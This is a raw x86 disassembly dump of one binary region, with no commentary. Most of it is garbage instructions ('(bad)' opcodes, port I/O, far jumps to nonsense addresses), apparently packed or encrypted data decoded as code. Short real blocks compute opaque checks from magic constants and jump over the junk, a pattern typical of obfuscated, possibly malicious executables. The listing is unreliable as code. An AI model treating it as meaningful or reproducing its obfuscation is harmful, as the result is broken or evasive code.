  40d12c:	xchg   edx,eax
  40d12d:	mov    ds:0xd524048,eax
  40d132:	xor    ecx,edx
  40d134:	adc    al,0x50
  40d136:	in     eax,0x30
  40d138:	cwde   
  40d139:	in     al,0x80
  40d13b:	add    BYTE PTR [edi-0x4c7885bd],bl
  40d141:	test   BYTE PTR [ecx-0x6b],0x8
  40d145:	repnz mov ds:0x80bef8ba,eax
  40d14b:	xlat   BYTE PTR ds:[ebx]
  40d14c:	enter  0xf7d0,0x4e
  40d150:	in     eax,0x64
  40d152:	pop    ebx
  40d153:	xchg   edi,eax
  40d154:	mov    edx,0x2ef8e470
  40d159:	or     BYTE PTR [ebx],0x78
  40d15c:	pop    eax
  40d15d:	mov    fs,WORD PTR [ebp+0x51ff14a4]
  40d163:	ds sti 
  40d165:	scas   al,BYTE PTR es:[edi]
  40d166:	dec    ecx
  40d167:	lds    eax,FWORD PTR [ecx-0x2a6e7f4a]
  40d16d:	fbld   TBYTE PTR [ebx+0x1c]
  40d170:	push   eax
  40d171:	gs popa 
  40d173:	mov    ds:0x91c7b77f,eax
  40d178:	in     eax,0x80
  40d17a:	dec    edi
  40d17b:	hlt    
  40d17c:	sahf   
  40d17d:	js     0x40d1cd
  40d17f:	scas   eax,DWORD PTR es:[edi]
  40d180:	xchg   ecx,eax
  40d181:	loope  0x40d112
  40d183:	pushw  0xda14
  40d187:	xchg   edi,eax
  40d188:	and    bh,BYTE PTR [ebx]
  40d18a:	mov    bl,BYTE PTR [esi-0x7b]
  40d18d:	sar    edi,0xec
  40d190:	mov    ds:0x96682a3c,al
  40d195:	(bad)  [edi-0x2c]
  40d198:	rol    DWORD PTR [edx],cl
  40d19a:	mov    al,0xdd
  40d19c:	cmp    ah,ch
  40d19e:	mov    cl,0x94
  40d1a0:	cmp    esp,ecx
  40d1a2:	jae    0x40d144
  40d1a4:	sub    eax,esi
  40d1a6:	cwde   
  40d1a7:	jno    0x40d1b7
  40d1a9:	push   edx
  40d1aa:	jle    0x40d227
  40d1ac:	mov    edi,0xec137e4d
  40d1b1:	stos   BYTE PTR es:[edi],al
  40d1b2:	adc    edx,eax
  40d1b4:	add    BYTE PTR [ecx+eax*8],dh
  40d1b7:	lds    esp,FWORD PTR [edi-0x51cc0797]
  40d1bd:	and    BYTE PTR [ecx-0x11918d98],bh
  40d1c3:	fdivr  st,st(6)
  40d1c5:	(bad)  
  40d1c7:	pop    ds
  40d1c8:	or     al,0x5c
  40d1ca:	jne    0x40d1c6
  40d1cc:	mov    edx,0x5ead0f6c
  40d1d1:	sbb    BYTE PTR [eax],0x41
  40d1d4:	xchg   ebx,eax
  40d1d5:	fmul   QWORD PTR [edx-0x6a]
  40d1d8:	test   eax,0xfac9208f
  40d1dd:	add    ebx,DWORD PTR [ecx-0x41]
  40d1e0:	in     al,dx
  40d1e1:	aam    0x8a
  40d1e3:	push   ss
  40d1e4:	mov    dl,0x71
  40d1e6:	(bad)  [edi-0x51c3fa06]
  40d1ec:	add    ecx,DWORD PTR [edi+0x68c2179c]
  40d1f2:	sahf   
  40d1f3:	jnp    0x40d273
  40d1f5:	adc    dl,BYTE PTR [esi-0x5f]
  40d1f8:	or     BYTE PTR [ebx],0xa7
  40d1fb:	push   0x59
  40d1fd:	je     0x40d237
  40d1ff:	push   ds
  40d200:	dec    ebx
  40d201:	cli    
  40d202:	pushf  
  40d203:	out    0x6d,al
  40d205:	jnp    0x40d271
  40d207:	pop    eax
  40d208:	and    ch,BYTE PTR [esi]
  40d20a:	mov    eax,0xc921a58f
  40d20f:	(bad)  
  40d210:	jmp    0x40d24c
  40d212:	cmp    ebp,DWORD PTR [ebx]
  40d214:	mov    ebp,ebx
  40d216:	fisttp DWORD PTR [eax]
  40d218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d219:	call   0x3d08:0xf0bf9985
  40d220:	dec    esp
  40d221:	push   eax
  40d222:	fiadd  WORD PTR [esi]
  40d224:	pop    ebx
  40d225:	loop   0x40d244
  40d227:	fwait
  40d228:	std    
  40d229:	jb     0x40d27c
  40d22b:	repnz sub ch,BYTE PTR [edi]
  40d22e:	push   DWORD PTR [edx+0x292a096c]
  40d234:	pop    edi
  40d235:	fs push ebx
  40d237:	sbb    dh,al
  40d239:	ret    0x7412
  40d23c:	and    eax,DWORD PTR [ecx-0x17ce95ce]
  40d242:	leave  
  40d243:	mov    cl,0xea
  40d245:	xchg   esi,eax
  40d246:	loopne 0x40d279
  40d248:	cld    
  40d249:	cs adc al,0xe9
  40d24c:	inc    esp
  40d24d:	(bad)  
  40d24e:	fsub   DWORD PTR [eax-0x15d909db]
  40d254:	(bad)  
  40d255:	je     0x40d21b
  40d257:	addr16 mov ebp,0x6d07d3bf
  40d25d:	mov    ah,0x88
  40d25f:	add    al,0xe
  40d261:	mov    eax,DWORD PTR [ebp-0x14]
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	stos   BYTE PTR es:[edi],al
  40d2f3:	(bad)  
  40d2f5:	jo     0x40d324
  40d2f7:	loop   0x40d311
  40d2f9:	sbb    dl,dl
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    BYTE PTR [edi],dh
  40d2ff:	dec    eax
  40d300:	cmc    
  40d301:	xor    BYTE PTR [eax+0x43],ch
  40d304:	arpl   WORD PTR gs:[ecx-0x4d],sp
  40d308:	fiadd  WORD PTR [ecx]
  40d30a:	dec    ebp
  40d30b:	aam    0x90
  40d30d:	xlat   BYTE PTR ds:[ebx]
  40d30e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d30f:	icebp  
  40d310:	fcmove st,st(6)
  40d312:	daa    
  40d313:	add    edi,eax
  40d315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d316:	fs adc eax,0xa314f772
  40d31c:	cli    
  40d31d:	in     eax,dx
  40d31e:	js     0x40d2b3
  40d320:	cmp    eax,0xdb5a04cd
  40d325:	repnz leave 
  40d327:	cmp    esp,DWORD PTR ds:0xbf0e02e6
  40d32d:	mov    bh,0xa6
  40d32f:	adc    BYTE PTR [edx+edx*2+0x2a],bh
  40d333:	dec    eax
  40d334:	jmp    0xbfe8:0x476dcca5
  40d33b:	xor    ebp,esi
  40d33d:	and    eax,0xf9a1322b
  40d342:	mov    ah,0x13
  40d344:	jne    0x40d316
  40d346:	lea    eax,[eax+0x2dae78ec]
  40d34c:	push   esi
  40d34d:	add    dh,BYTE PTR [esi+ebx*4+0x5a]
  40d351:	aam    0xd2
  40d353:	dec    ebp
  40d354:	fcomp  QWORD PTR [esi+0x5da3f859]
  40d35a:	std    
  40d35b:	or     eax,DWORD PTR [edx-0x24]
  40d35e:	nop
  40d35f:	add    ch,dh
  40d361:	mov    edi,0x500c2a1b
  40d366:	iret   
  40d367:	out    dx,eax
  40d368:	inc    esp
  40d369:	push   0x6652650b
  40d36e:	inc    edx
  40d36f:	inc    edx
  40d370:	and    eax,0x873847e0
  40d375:	es cmp ebx,eax
  40d378:	aas    
  40d379:	and    al,ch
  40d37b:	jae    0x40d3a7
  40d37d:	adc    cl,al
  40d37f:	dec    esp
  40d380:	in     al,0x98
  40d382:	es mov edx,0xdd80bd44
  40d388:	ret    
  40d389:	xlat   BYTE PTR ds:[ebx]
  40d38a:	pop    esi
  40d38b:	jmp    0x95b5:0xe76c2b1b
  40d392:	loope  0x40d3bb
  40d394:	stc    
  40d395:	lahf   
  40d396:	mov    ecx,0x31b4943b
  40d39b:	dec    esp
  40d39c:	rcl    edx,cl
  40d39e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d39f:	pop    esp
  40d3a0:	push   ebp
  40d3a1:	(bad)  
  40d3a2:	js     0x40d325
  40d3a4:	or     al,0x73
  40d3a6:	dec    ecx
  40d3a7:	xchg   ebx,eax
  40d3a8:	inc    eax
  40d3a9:	hlt    
  40d3aa:	das    
  40d3ab:	pop    ds
  40d3ac:	mov    edi,0xd3c064f6
  40d3b1:	mov    ecx,0xfd24d574
  40d3b6:	hlt    
  40d3b7:	sub    eax,0x1beb3120
  40d3bc:	pop    ebx
  40d3bd:	pop    ebx
  40d3be:	jg     0x40d41a
  40d3c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3c1:	or     dh,dh
  40d3c3:	test   BYTE PTR ds:[edi-0x64],bh
  40d3c7:	ror    BYTE PTR [eax-0x64],0x7f
  40d3cb:	push   edx
  40d3cc:	adc    ch,al
  40d3ce:	adc    eax,DWORD PTR ds:0x287a8b25
  40d3d4:	enter  0x6aab,0x10
  40d3d8:	lods   al,BYTE PTR ds:[esi]
  40d3d9:	sub    BYTE PTR [ecx+0x49],dl
  40d3dc:	and    al,0xb7
  40d3de:	sub    BYTE PTR [edx+0x25],dl
  40d3e1:	xor    eax,0xd8c07745
  40d3e6:	(bad)  
  40d3e7:	cmp    DWORD PTR [ebp+eax*2+0x1f],ebp
  40d3eb:	xor    al,0x20
  40d3ed:	leave  
  40d3ee:	push   edx
  40d3ef:	add    al,0x4d
  40d3f1:	fld    st(2)
  40d3f3:	fdivr  DWORD PTR [edi+0x192d4182]
  40d3f9:	fcom   QWORD PTR [edi]
  40d3fb:	pop    ebx
  40d3fc:	pop    edx
  40d3fd:	jecxz  0x40d40e
  40d3ff:	cmp    ah,dl
  40d401:	scas   al,BYTE PTR es:[edi]
  40d402:	scas   al,BYTE PTR es:[edi]
  40d403:	sahf   
  40d404:	prefetcht2 BYTE PTR [eax]
  40d407:	imul   esi,ebp,0xffffffdf
  40d40a:	jo     0x40d488
  40d40c:	pop    edi
  40d40d:	xchg   ebp,eax
  40d40e:	in     al,dx
  40d40f:	cmovns ebx,ecx
  40d412:	(bad)  
  40d413:	mov    dl,0xfb
  40d415:	mov    esi,0xa030ec80
  40d41a:	inc    ebp
  40d41b:	je     0x40d483
  40d41d:	mov    BYTE PTR [eax+ebx*8-0xed42de3],ah
  40d424:	ficomp DWORD PTR [ecx-0x307ea551]
  40d42a:	imul   ebp,edi,0x69
  40d42d:	mov    bh,0xa8
  40d42f:	popf   
  40d430:	daa    
  40d431:	fidiv  WORD PTR [esp+ecx*2]
  40d434:	mov    ds:0x4213bc1e,eax
  40d439:	jg     0x40d45d
  40d43b:	adc    al,0xed
  40d43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d43e:	sti    
  40d43f:	adc    BYTE PTR [ebp+0x43],dl
  40d442:	shl    BYTE PTR [edi],cl
  40d444:	and    esi,DWORD PTR ds:0x84fe9bbd
  40d44a:	test   esp,ebp
  40d44c:	mov    eax,ds:0x97904d6
  40d451:	loope  0x40d42d
  40d453:	cmp    ch,BYTE PTR [edx-0xa]
  40d456:	je     0x40d424
  40d458:	fprem1 
  40d45a:	xor    edx,ebx
  40d45c:	rol    BYTE PTR [ebx+0xc],0x1b
  40d460:	daa    
  40d461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d462:	and    DWORD PTR [esp+eiz*8],esi
  40d465:	cmp    eax,DWORD PTR [ecx]
  40d467:	push   esi
  40d468:	out    dx,al
  40d469:	shl    dh,1
  40d46b:	sbb    DWORD PTR [edi-0xd1629b6],0x6508197d
  40d475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d476:	mov    cs,ecx
  40d478:	bound  ebp,QWORD PTR [esi+ecx*8+0x2b]
  40d47c:	jecxz  0x40d469
  40d47e:	fidivr DWORD PTR [ebp+ecx*8-0x62e42691]
  40d485:	push   ecx
  40d486:	lods   al,BYTE PTR ds:[esi]
  40d487:	xlat   BYTE PTR ds:[ebx]
  40d488:	pop    esi
  40d489:	pop    ebp
  40d48a:	retf   
  40d48b:	add    al,bh
  40d48d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d48e:	and    dl,ch
  40d490:	xchg   ebp,eax
  40d491:	cmp    edx,DWORD PTR [ecx-0x74aec47a]
  40d497:	jge    0x40d41f
  40d499:	and    BYTE PTR [edi-0x79],0x1e
  40d49d:	iret   
  40d49e:	aad    0x19
  40d4a0:	jmp    esp
  40d4a2:	les    eax,FWORD PTR [edi+ebp*4-0x1afcda0e]
  40d4a9:	out    0x8e,eax
  40d4ab:	xchg   edx,eax
  40d4ac:	adc    dh,al
  40d4ae:	js     0x40d4e8
  40d4b0:	dec    esi
  40d4b1:	daa    
  40d4b2:	leave  
  40d4b3:	or     bl,bl
  40d4b5:	shl    DWORD PTR [eax+0x687f270],1
  40d4bb:	into   
  40d4bc:	cwde   
  40d4bd:	push   cs
  40d4be:	inc    ecx
  40d4bf:	fcomp  DWORD PTR [ebp+0x3593d6ef]
  40d4c5:	aas    
  40d4c6:	rcl    edi,1
  40d4c8:	jo     0x40d44c
  40d4ca:	mov    al,0x68
  40d4cc:	add    eax,0x5afc3834
  40d4d1:	sbb    al,0xe7
  40d4d3:	in     eax,dx
  40d4d4:	dec    esp
  40d4d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4d6:	mov    eax,0x64900993
  40d4db:	popf   
  40d4dc:	push   0x3854e5a9
  40d4e1:	push   edx
  40d4e2:	push   ss
  40d4e3:	sahf   
  40d4e4:	sbb    esi,DWORD PTR [edi-0x6]
  40d4e7:	fadd   DWORD PTR [edx+0x2700ff3c]
  40d4ed:	cmp    DWORD PTR [eax],esp
  40d4ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4f0:	jle    0x40d540
  40d4f2:	jg     0x40d4bf
  40d4f4:	add    eax,0xc7807d97
  40d4f9:	mov    DWORD PTR [edi+edx*8],esi
  40d4fc:	and    DWORD PTR [esp+ebx*4-0x1],esi
  40d500:	add    eax,0xe06bb1a0
  40d505:	loope  0x40d525
  40d507:	fcom   QWORD PTR [edi]
  40d509:	add    BYTE PTR [ecx],cl
  40d50b:	test   BYTE PTR [esi-0x55b8f6ed],0x75
  40d512:	imul   edi,esi,0x638d56e3
  40d518:	sub    al,0x40
  40d51a:	xor    al,0x42
  40d51c:	jmp    0x39406f80
  40d521:	(bad)  
  40d522:	repz bound eax,QWORD PTR [eax]
  40d525:	push   es
  40d526:	test   bh,al
  40d528:	repz pop edx
  40d52a:	adc    al,0xab
  40d52c:	push   es
  40d52d:	dec    esi
  40d52e:	or     DWORD PTR [edx+0x45],edx
  40d531:	in     eax,dx
  40d532:	push   0xffffffff
  40d534:	lahf   
  40d535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d536:	mov    ebp,0x4128e74a
  40d53b:	push   edx
  40d53c:	cs add dh,dh
  40d53f:	xor    al,0xf6
  40d541:	mov    edx,0x96c8214
  40d546:	shl    cl,cl
  40d548:	pop    ebx
  40d549:	scas   al,BYTE PTR es:[edi]
  40d54a:	jecxz  0x40d511
  40d54c:	(bad)  
  40d54d:	cmc    
  40d54e:	mov    DWORD PTR [eax+eiz*8],ebp
  40d551:	sbb    DWORD PTR [edi-0x34a7700f],0x6f
  40d558:	test   BYTE PTR [esi+ebp*1],ch
  40d55b:	repz fdivr DWORD PTR [ebx+0x3ee97360]
  40d562:	ror    esi,1
  40d564:	hlt    
  40d565:	pop    ebx
  40d566:	xchg   ah,dl
  40d568:	jg     0x40d513
  40d56a:	ds xchg ebx,eax
  40d56c:	dec    esi
  40d56d:	mov    dh,0xae
  40d56f:	call   0x45c0dc25
  40d574:	mov    ch,0x8d
  40d576:	push   ss
  40d577:	jle    0x40d519
  40d579:	sbb    edx,DWORD PTR [eax+0x5c5893f9]
  40d57f:	adc    BYTE PTR [edi+esi*8-0x7b8d09a5],bl
  40d586:	shr    DWORD PTR [ebp-0x16],1
  40d589:	mov    ah,0x5e
  40d58b:	xchg   esp,eax
  40d58d:	jecxz  0x40d5d4
  40d58f:	sub    DWORD PTR [ecx],0xffffffa4
  40d592:	sbb    eax,0x976adcdd
  40d597:	lahf   
  40d598:	inc    ecx
  40d599:	ds push ds
  40d59b:	add    BYTE PTR [edx+0x3d],dl
  40d59e:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40d5a0:	fisubr DWORD PTR [eax]
  40d5a2:	out    0x2e,eax
  40d5a4:	push   edi
  40d5a5:	mov    ecx,DWORD PTR [ebp-0x20]
  40d5a8:	xor    edx,edx
  40d5aa:	jmp    0x40d86e
  40d5af:	pop    edx
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	jno    0x40d5fc
  40d5bd:	sbb    edi,DWORD PTR [esi-0x19]
  40d5c0:	fcomp  QWORD PTR [eax]
  40d5c2:	sbb    dl,dl
  40d5c4:	adc    al,0x18
  40d5c6:	sbb    BYTE PTR [esi],bl
  40d5c8:	ret    
  40d5c9:	and    dh,bh
  40d5cb:	outs   dx,BYTE PTR ds:[esi]
  40d5cc:	fld    DWORD PTR [edi]
  40d5ce:	loop   0x40d569
  40d5d0:	jle    0x40d554
  40d5d2:	mov    ds:0x58abf169,al
  40d5d7:	add    DWORD PTR ds:0x460e98a7,0x2fc25628
  40d5e1:	mov    ds:0x74048c48,al
  40d5e6:	dec    eax
  40d5e7:	data16 jae 0x40d580
  40d5ea:	xchg   ebx,eax
  40d5eb:	scas   eax,DWORD PTR es:[edi]
  40d5ec:	loope  0x40d650
  40d5ee:	adc    ch,0xf2
  40d5f1:	(bad)  
  40d5f2:	cmp    DWORD PTR [esi-0x20],esi
  40d5f5:	mov    al,0xe3
  40d5f7:	and    al,0xa5
  40d5f9:	sub    BYTE PTR [edi+ebx*4-0x61],cl
  40d5fd:	jne    0x40d5c0
  40d5ff:	jecxz  0x40d5ce
  40d601:	loopne 0x40d673
  40d603:	fild   QWORD PTR [ecx+eiz*1]
  40d606:	inc    edi
  40d607:	cmp    BYTE PTR ds:0x6d73882b,dl
  40d60e:	fnstcw WORD PTR [edx-0x58acfa58]
  40d614:	pop    ds
  40d615:	jmp    0xbdae:0xb948
  40d61b:	lea    esp,[ecx+0x2939807]
  40d621:	sbb    DWORD PTR [esi],esp
  40d623:	cmp    DWORD PTR [ebx-0x54c94d49],esp
  40d629:	push   0xf2749f9
  40d62e:	jmp    0x2a33f7c7
  40d633:	adc    DWORD PTR [ecx],esp
  40d635:	or     BYTE PTR [esi+eiz*8+0x6a],0x30
  40d63a:	cwde   
  40d63b:	sub    dl,bh
  40d63d:	(bad)  
  40d63e:	xchg   DWORD PTR [esi-0x4a342a08],ebx
  40d644:	in     al,dx
  40d645:	pushf  
  40d646:	fbstp  TBYTE PTR [esi]
  40d648:	cmc    
  40d649:	dec    ebp
  40d64a:	inc    ebx
  40d64b:	xchg   esp,eax
  40d64c:	push   eax
  40d64d:	cmp    eax,0xd96be233
  40d652:	outs   dx,DWORD PTR ds:[esi]
  40d653:	mov    edx,0x3fdc0e48
  40d658:	fimul  DWORD PTR [edx+0x542e2eed]
  40d65e:	enter  0xce4a,0xed
  40d662:	scas   eax,DWORD PTR es:[edi]
  40d663:	cli    
  40d664:	imul   edx,ecx,0x37
  40d667:	pushf  
  40d668:	push   ebp
  40d669:	mov    ebp,0x2406a662
  40d66e:	add    ecx,esi
  40d670:	jp     0x40d653
  40d672:	(bad)  
  40d673:	xchg   esp,eax
  40d674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d675:	retf   0xb23f
  40d678:	ret    
  40d679:	and    eax,0x9095ec47
  40d67e:	inc    esi
  40d67f:	iret   
  40d680:	clc    
  40d681:	(bad)  [ebp+esi*2-0x5a]
  40d685:	xor    dl,BYTE PTR [esi-0x40835830]
  40d68b:	adc    DWORD PTR [ebp-0x5502d724],0xa1b76c32
  40d695:	mov    ecx,0x7f1fc306
  40d69a:	xchg   esp,eax
  40d69b:	int3   
  40d69c:	xchg   BYTE PTR ds:0xbcc84c18,dl
  40d6a2:	pop    es
  40d6a3:	inc    eax
  40d6a4:	ret    
  40d6a5:	sub    DWORD PTR [edx],esp
  40d6a7:	std    
  40d6a8:	in     eax,dx
  40d6a9:	shl    BYTE PTR [ecx],0xd0
  40d6ac:	adc    DWORD PTR [ebp-0x399b4f6d],ebx
  40d6b2:	dec    ebp
  40d6b3:	sub    eax,edi
  40d6b5:	ins    DWORD PTR es:[edi],dx
  40d6b6:	scas   al,BYTE PTR es:[edi]
  40d6b7:	add    al,0x9e
  40d6b9:	sub    eax,0xc200a2c8
  40d6be:	jle    0x40d6e2
  40d6c0:	addr16 sti 
  40d6c2:	mov    esp,0xf288453d
  40d6c7:	int3   
  40d6c8:	std    
  40d6c9:	push   esp
  40d6ca:	or     al,0x28
  40d6cc:	jle    0x40d68c
  40d6ce:	js     0x40d6d5
  40d6d0:	(bad)  
  40d6d1:	fcom   st(3)
  40d6d3:	imul   edx,DWORD PTR [ebx+0x7],0x70
  40d6d7:	xor    cl,BYTE PTR [eax+0x5fa5fee6]
  40d6dd:	push   edx
  40d6de:	pop    ebx
  40d6df:	ror    BYTE PTR [ecx+0x66],cl
  40d6e2:	sub    eax,0x2016e8b1
  40d6e7:	jno    0x40d753
  40d6e9:	and    DWORD PTR [edi],0x60c73828
  40d6ef:	jmp    0x99de:0xb6b53bc2
  40d6f6:	dec    ecx
  40d6f7:	ror    esp,1
  40d6f9:	std    
  40d6fa:	mov    ch,0x52
  40d6fc:	data16 fisub WORD PTR [ebx]
  40d6ff:	or     bh,0x4b
  40d702:	test   DWORD PTR [eax-0x3c4d036a],ebp
  40d708:	adc    eax,0x3b45aa4a
  40d70d:	int    0x9b
  40d70f:	and    BYTE PTR [eax-0x77],bl
  40d712:	or     esp,DWORD PTR [ebx]
  40d714:	call   0xe942bac2
  40d719:	pop    esp
  40d71a:	lea    esi,[edi+0x18]
  40d71d:	aaa    
  40d71e:	jno    0x40d6ff
  40d720:	sub    eax,0x1ac8a802
  40d725:	pop    es
  40d726:	jg     0x40d7a4
  40d728:	dec    ebx
  40d729:	jae    0x40d756
  40d72b:	xchg   edx,eax
  40d72c:	mov    gs,WORD PTR [eax]
  40d72e:	gs xor esi,eax
  40d731:	mov    dl,0x74
  40d733:	inc    BYTE PTR [edx-0x75667ab9]
  40d739:	sub    DWORD PTR [eax+0x43cb3d7e],esi
  40d73f:	jo     0x40d78c
  40d741:	js     0x40d77b
  40d743:	xchg   esp,eax
  40d744:	(bad)  [ecx]
  40d746:	jle    0x40d72b
  40d748:	(bad)  
  40d749:	mov    eax,0xb904b7fe
  40d74e:	mov    esp,0xc4f660c4
  40d753:	aas    
  40d754:	sbb    BYTE PTR [eax],bh
  40d756:	mov    eax,0x6cf2060d
  40d75b:	(bad)  
  40d75c:	sahf   
  40d75d:	je     0x40d739
  40d75f:	aam    0xff
  40d761:	(bad)  
  40d762:	jmp    0xc4e9:0x8a88054e
  40d769:	outs   dx,BYTE PTR ds:[esi]
  40d76a:	ret    0x339f
  40d76d:	xor    ecx,ebx
  40d76f:	sub    ch,BYTE PTR [eax]
  40d771:	adc    edx,DWORD PTR [ecx-0x68]
  40d774:	aas    
  40d775:	div    esi
  40d777:	jl     0x40d72d
  40d779:	ss in  al,0xb4
  40d77c:	fistp  DWORD PTR [esi+ebp*4]
  40d77f:	in     eax,dx
  40d780:	and    dh,0x5a
  40d783:	mov    ecx,esp
  40d785:	and    DWORD PTR [esi+0x42],esi
  40d788:	pop    edi
  40d789:	je     0x40d722
  40d78b:	cmp    eax,0xa86f7266
  40d790:	out    0x50,al
  40d792:	cdq    
  40d793:	ror    BYTE PTR [eax],cl
  40d795:	test   DWORD PTR [ebx],ecx
  40d797:	push   ecx
  40d798:	test   al,0x2
  40d79a:	enter  0x7313,0xc0
  40d79e:	cmp    ah,bl
  40d7a0:	gs jl  0x40d7ff
  40d7a3:	stos   BYTE PTR es:[edi],al
  40d7a4:	push   cs
  40d7a5:	pushf  
  40d7a6:	pop    ss
  40d7a7:	test   BYTE PTR [edi-0x641b22aa],ch
  40d7ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7ae:	mov    dh,0x38
  40d7b0:	int3   
  40d7b1:	and    eax,0x400db57b
  40d7b6:	xchg   esi,eax
  40d7b7:	and    edi,DWORD PTR [ebx]
  40d7b9:	push   edx
  40d7ba:	dec    ecx
  40d7bb:	add    al,0x59
  40d7bd:	xor    esi,ecx
  40d7bf:	mov    bh,0x95
  40d7c1:	dec    ebx
  40d7c2:	jno    0x40d756
  40d7c4:	sbb    eax,0x3eb5c86c
  40d7c9:	arpl   WORD PTR [esi+0x6c],bp
  40d7cc:	push   ebx
  40d7cd:	adc    eax,DWORD PTR [ebp+0x1e]
  40d7d0:	mov    ebp,0xf1b616c3
  40d7d5:	push   0x6eb66777
  40d7da:	lock jns 0x40d81f
  40d7dd:	lock fnstenv [edx-0x50]
  40d7e1:	push   esp
  40d7e2:	sahf   
  40d7e3:	sbb    eax,ebp
  40d7e5:	xchg   edx,eax
  40d7e6:	mov    dl,0x2f
  40d7e8:	ins    BYTE PTR es:[edi],dx
  40d7e9:	jbe    0x40d803
  40d7eb:	jecxz  0x40d7cc
  40d7ed:	dec    ebp
  40d7ee:	inc    ebx
  40d7ef:	xchg   ecx,eax
  40d7f0:	fimul  DWORD PTR [ebp-0x5f07d2ae]
  40d7f6:	pop    ebx
  40d7f7:	and    eax,0x9098dac6
  40d7fc:	mov    al,0x4d
  40d7fe:	mov    esi,0xa725c6a8
  40d803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d804:	add    al,0xeb
  40d806:	and    DWORD PTR [ebp-0x73],edx
  40d809:	das    
  40d80a:	xor    eax,0x79fca00c
  40d80f:	xor    al,BYTE PTR [edi-0x2]
  40d812:	dec    edi
  40d813:	mov    edx,0x19b81cad
  40d818:	popf   
  40d819:	inc    esi
  40d81a:	arpl   WORD PTR [edx-0x7e675e75],dx
  40d820:	cmp    eax,0xe4ff57c1
  40d825:	ja     0x40d7b4
  40d827:	jno    0x40d897
  40d829:	add    al,0x65
  40d82b:	and    eax,0x660f6fc0
  40d830:	paddq  mm4,QWORD PTR [esi-0x79e13a8a]
  40d837:	rol    BYTE PTR [esi-0x4b],1
  40d83a:	jg     0x40d829
  40d83c:	popa   
  40d83d:	lea    ecx,[edx]
  40d83f:	cdq    
  40d840:	dec    esi
  40d841:	test   bh,dl
  40d843:	daa    
  40d844:	xchg   ebx,eax
  40d845:	mov    gs,eax
  40d847:	inc    esp
  40d848:	push   ss
  40d849:	iret   
  40d84a:	jb     0x40d862
  40d84c:	daa    
  40d84d:	(bad)  
  40d84e:	jmp    0x40d8b8
  40d850:	cmp    esi,esp
  40d852:	fimul  DWORD PTR [ecx+0x31]
  40d855:	mov    ah,0x51
  40d857:	retf   0xe878
  40d85a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40d85c:	jb     0x40d7f7
  40d85e:	pusha  
  40d85f:	pop    ds
  40d860:	mov    esp,0xc523c9cf
  40d865:	adc    eax,0xe1051300
  40d86a:	adc    DWORD PTR [esi-0x6b],0x4db5bf3e
  40d871:	add    BYTE PTR [eax],al
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0xb52cb6bc
  40d894:	jl     0x40d836
  40d896:	fcomp  DWORD PTR [eax]
  40d898:	sbb    dl,dl
  40d89a:	adc    al,0x18
  40d89c:	sbb    BYTE PTR [edi-0x6f],al
  40d89f:	jle    0x40d881
  40d8a1:	inc    ebx
  40d8a2:	fistp  QWORD PTR [edi-0x98268a8]
  40d8a8:	inc    dh
  40d8aa:	mov    al,ds:0x1a64eae8
  40d8af:	ins    DWORD PTR es:[edi],dx
  40d8b0:	call   0xbe5ec5c7
